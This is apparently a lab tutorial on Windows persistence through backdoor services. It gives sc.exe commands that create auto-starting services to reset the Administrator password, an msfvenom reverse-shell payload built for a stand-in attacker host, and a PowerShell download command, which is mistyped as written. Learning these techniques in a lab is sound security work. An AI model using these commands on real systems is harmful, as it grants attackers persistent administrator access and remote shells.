Creating backdoor services

We can create and start a service named "THMservice" using the following commands:

    -sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
    -sc.exe start THMservice
Note: There must be a space after each equal sign for the command to work.

The "net user" command will be executed when the service is started, resetting the Administrator's password to Passwd123. 
Notice how the service has been set to start automatically (start= auto), 
so that it runs without requiring user interaction.

Resetting a user's password works well enough, but we can also create a reverse shell with msfvenom and associate it with the created service. 
Notice, however, that service executables are unique since they need to implement a particular protocol to be handled by the system. 

If you want to create an executable that is compatible with Windows services, you can use the exe-service format in msfvenom:

Kali:
    -msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe

Open a web server in Kali to allow the Infected machine to download the payload:
    -python3 -m http.server 8000

Windows:
Powershell cmd to Download the payload and execute payload from the Kali MAchine:
    -powershell "(New-Object System.Net"WebClient).Downloadfile('http://ATTACK MACHINE IP:PORT/payloadNAme.exe','payloadName.exe')"
    
You can then copy the executable to your target system, say in C:\Windows and point the service's binPath to it:

    -sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
    -sc.exe start THMservice2
